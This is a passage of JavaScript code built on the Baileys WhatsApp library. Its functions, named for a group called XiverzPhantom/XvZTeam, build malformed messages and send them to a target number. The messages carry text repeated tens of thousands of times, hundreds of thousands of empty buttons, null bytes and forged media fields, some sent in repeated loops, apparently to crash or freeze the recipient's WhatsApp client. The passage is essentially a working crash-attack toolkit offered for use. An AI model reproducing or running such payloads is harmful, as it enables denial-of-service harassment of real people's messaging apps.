            contentType: "UPDATE",
          },
        },
      },
      ...carouselIOS,
      ...iosListMsg,
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.6669989,
            degreesLongtitude: 66.6699996,
            name: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(9000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(9000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
      requestPhoneNumberMessage: {
        contextInfo: {
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
              fileLength: 0,
              pageCount: 0,
              mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
              fileName: "IosOnly.pdf",
              fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
              directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1737369406,
              caption: "XiverzPhantom",
              title: "XiverzPhantom",
              mentionedJid: [target],
            }
          },
          externalAdReply: {
            title: "XiverzPhantom",
            body: "𑇂𑆵𑆴𑆿".repeat(75000),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            sourceUrl: "https://t.me/XiverzPhantomTeam",
            mediaUrl: "https://t.me/XiverzPhantomTeam",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
            newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
            contentType: "UPDATE",
          },
        },
        skipType: 7,
      }
    },
    {
      participant: target,
    }
  );

  try {
    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.6669989,
            degreesLongtitude: 66.6699996,
            name: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(9000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(9000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
    }, {});
    
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}
async function XvZiOSV1(sock, target) {
const a = " XvZTeam. " + "𑇂𑆵𑆴𑆿".repeat(70000); 
const b = "𑇂𑆵𑆴𑆿".repeat(70000);
   try {
      let c = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/XiverzPhantomTeam",
      }
      let d = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex: c
            }
         }
      }, {});
      let e = {
         extendedTextMessage: { 
            text: b,
            matchedText: " XvZTeam. ",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let f = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx: e
            }
         }
      }, {});
      let g = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(17000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(11000), 
         url: `${"𑇂𑆵𑆴𑆿".repeat(28000)}`, 
      }
      let h = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage: g
            }
         }
      }, {});
      let i = {
         extendedTextMessage: { 
            text: a, 
            matchedText: " XiverzPhantom. ",
            description: "𑇂𑆵𑆴𑆿".repeat(29000),
            title: " XiverzPhantom. " + "𑇂𑆵𑆴𑆿".repeat(19000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let j = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg: i
            }
         }
      }, {});
      let k = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage: g
            }
         }
      }, {});
      
      for (let i = 0; i < 40; i++) {
      await sock.relayMessage('status@broadcast', d.message, {
         messageId: d.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', f.message, {
         messageId: f.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', d.message, {
         messageId: d.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', f.message, {
         messageId: f.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', k.message, {
         messageId: f.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) { /* kenapa bang? */ }
};
async function XvZiOSV2(sock, target) {
  const ios = {
   viewOnceMessage: {
    message: {
       locationMessage: {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         name: "XiverzPhantom?" + "𑇂𑆵𑆴𑆿".repeat(15000),
         url: `https://XiverzPhanton${"𑇂𑆵𑆴𑆿".repeat(15000)}.com`,
         address: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(15000),
         contextInfo: {
           mentionedJid: [
             target,
             ...Array.from(
               { length: 1900 },
               () => `1${Math.floor(Math.random() * 90000)}@s.whatsapp.net`
              )
            ],
           externalAdReply: {
             quotedAd: {
               advertiserName: "XiverzPhantom?" + "𑇂𑆵𑆴𑆿".repeat(15000),
               mediaType: "IMAGE",
               jpegThumbnail: null,
               caption: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(15000),
              },
             placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
            },
          },
        },
      },
    },
  };

  const generated = generateWAMessageFromContent(target, ios, {});
  await sock.relayMessage(target, generated.message, {
    messageId: generated.key.id,
    participant: { jid: target }
  });
}
async function XvZiOSV3(sock, target) {
  const CodeA = generateWAMessageFromContent(target, {
   groupStatusMessageV2: {
     message: {
       interactiveMessage: {
         header: {
           imageMessage: {
             url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
             mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: "9999",
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "AlipzzyOfficiaL",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: { text: "— AlipzzyOfficiaL#" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, CodeA.message, {
    participant: { jid: target },
    messageId: CodeA.key.id
  });

  const CodeB = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "code.pdf",
            hasMediaAttachment: true,
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
              fileLength: "999999999",
              pageCount: 1000,
              mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
              fileName: "billy.pdf",
              fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
              directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1779839963",
              thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
              thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
              thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
              jpegThumbnail: null,
              contextInfo: {},
              thumbnailHeight: 999,
              thumbnailWidth: 999
            }
          },
          body: { text: "AlipzzyOfficiaL#/." },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, CodeB.message, {
    participant: { jid: target },
    messageId: CodeB.key.id
  });

  const Pemanis = generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
        title: "XvZ-Team"
      },
      body: {
        text: "XiverzPhantom"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      },
      contextInfo: {
        mentionedJid: [target],
        forwardingScore: 9898989,
        isForwarded: true
      }
    }
  }, {});

  await sock.relayMessage(target, Pemanis.message, {
    participant: { jid: target },
    messageId: Pemanis.key.id
  });

  const CodeX = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=EXPIRED_HASH&oe=5F000000&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: crypto.randomBytes(32).toString("base64"),
              fileLength: 9999999999999,
              height: 99999,
              width: 99999,
              mediaKey: crypto.randomBytes(32).toString("base64"),
              fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
              directPath: "/m1/v/t24/00002299291718920200291920729100",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
              caption: "nani desuka?",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: { text: "— XiverzPhantom#" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({}))
          }
        }
      }
    }
  };

  const CodeCrypto = generateWAMessageFromContent(target, CodeX, {});
  await sock.relayMessage(target, CodeCrypto.message, {
    participant: { jid: target },
    messageId: CodeCrypto.key.id
  });
}
async function XvZFc(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "XiverzPhantom" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, { participant: true });

  await sock.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: { text: " XvZTeam. ", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "FORM_SCREEN",
        version: 3
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + "CALL_ACCESS",
        isForwarded: true,
        forwardingScore: 999,
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({}))
        }
      }
    }
  }, {
    participant: true,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: [] }]
      }]
    }]
  });
}

async function XvZFcV1(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        title: "XiverzPhantom ¡!",
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
          fileLength: 9999,
          height: 9999,
          width: 9999,
          mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
          fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
          directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1776937541",
          jpegThumbnail: null,
          caption: "XvZTeam¡!",
          scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
          scanLengths: [
            9999999999999999999,
            9999999999999999999,
            9999999999999999999,
            9999999999999999999
          ],
          midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        }
      },
      body: {
                text: "XiverzPhantom"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "XiverzPhantom",
              id: "send"
            })
          }
        ]
      },
      contextInfo: {
        quotedMessage: {
          stickerPackMessage: {
                  name: "XiverzPhantom"
          }
        },
        remoteJid: "status@broadcast",
        participant: target//aiJid
      }
    }
  }, {});
}

async function XvZFcV2(target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveMessage: {
      title: " XvZ ",
      header: {},
      carouselMessage: {},
      body: {
        text: " \r "
      },
      bloksWidget: {
        uuid: "cw-a2ui-4",
        data: "[".repeat(200000),
        type: "im_a2ui",
        fallback: "A2UI"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "request_contact_info",
            buttonParamsJson: "{}"
          }
        ]
      },
      messageParamsJson: "{}"
    }
      },
    }
  }, {
    isSecret: true 
  })
}
async function XvZBlank(sock, target) {
    const rezzonly3 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "🦠XvZTeam꧀"
                    },
                    body: {
                        text: "[{".repeat(1000) + "}]".repeat(1000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };
const msg1 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "🦠XvZTeam",
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
                nativeFlowResponsMessage: {
                  buttons: Array.from({ length: 500000 }, () => ({})),
                },
              },
            },
          },
        },
      };
    
const rezzonly1 = {
        interactiveMessage: {
            body: {
                text: "XiverzPhantom - No Counter꧀"
            },
            nativeFlowMessage: {
                buttons: "\n".repeat(250000) + "\0".repeat(250000)
            }
        }
    };

    const rezzonly2 = {
        interactiveMessage: {
            body: {
                text: "XiverzPhantom"
            },
            nativeFlowMessage: {
                buttons: "\n".repeat(250000) + "\0".repeat(250000),
                encryptedParams: {
                    value: "\u2066".repeat(20000)
                }
            }
        }
    };

    await sock.relayMessage(target, rezzonly1, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, rezzonly2, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, rezzonly3, {
        participant: { jid: target }
    });
}
async function XvZBlankV1(sock, target) {
  const msg = {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "9999999@newsletter",
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000) + "\u000F".repeat(50000),
          caption: "#— XiverzPhantom No Counter ⚘\n" + "𑇂𑆵𑆴𑆿".repeat(30000) + "\u000C".repeat(50000),
          inviteExpiration: Date.now() + 86400000,
          jpegThumbnail: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0xFF, 0xC0, 0x00, 0x11, 0x08, 0xFF, 0xFF, 0xFF, 0xFF]),
          contextInfo: {
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterName: "𑇂𑆵𑆴𑆿".repeat(20000) + "ြ".repeat(50000),
                caption: "ြ".repeat(50000)
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}
async function XvZBlankV2(sock, target) {
    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "XiverzPhantom¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "XiverzPhantom¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
